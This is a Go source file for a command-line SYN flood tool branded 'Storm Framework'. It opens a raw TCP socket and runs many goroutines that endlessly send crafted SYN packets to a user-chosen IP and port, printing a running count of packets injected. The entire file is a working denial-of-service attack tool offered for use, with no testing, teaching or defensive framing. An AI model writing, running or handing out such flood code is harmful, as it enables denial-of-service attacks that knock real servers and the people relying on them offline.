// MIT License.
// Copyright (c) 2026 Storm Framework
// See LICENSE file in the project root for full license information.
package main
import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync/atomic"
	"syscall"
	"time"
)
var count uint64
func main() {
	targetIP := flag.String("t", "", "Target IP")
	port := flag.Int("p", 80, "Target Port")
	threads := flag.Int("w", 10, "Threads")
	flag.Parse()

	if *targetIP == "" {
		fmt.Println("Usage: sudo ./syn_flooder -t <IP> -p <PORT> -w <THREADS>")
		return
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Printf("[-] ERROR: RUN SUDO! (%v)\n", err)
		os.Exit(1)
	}

	addr := syscall.SockaddrInet4{Port: *port}
	copy(addr.Addr[:], net.ParseIP(*targetIP).To4())

	fmt.Printf("[!] Storm-OS SYN Flood: %s:%d | Threads: %d\n", *targetIP, *port, *threads)

	go func() {
		for {
			fmt.Printf("\r[*] SYN Packets Injected: %d", atomic.LoadUint64(&count))
			time.Sleep(1 * time.Second)
		}
	}()

	for i := 0; i < *threads; i++ {
		go func() {
			for {
				packet := make([]byte, 20)
				srcPort := uint16(time.Now().UnixNano()%64511 + 1024)
				packet[0], packet[1] = byte(srcPort>>8), byte(srcPort&0xff)
				packet[2], packet[3] = byte(*port>>8), byte(*port&0xff)
				packet[4], packet[5], packet[6], packet[7] = 0x01, 0x02, 0x03, 0x04
				packet[12] = 0x50
				packet[13] = 0x02
				packet[14], packet[15] = 0x72, 0x10
				err := syscall.Sendto(fd, packet, 0, &addr)
				if err == nil {
					atomic.AddUint64(&count, 1)
				}
			}
		}()
	}

	select {}
}
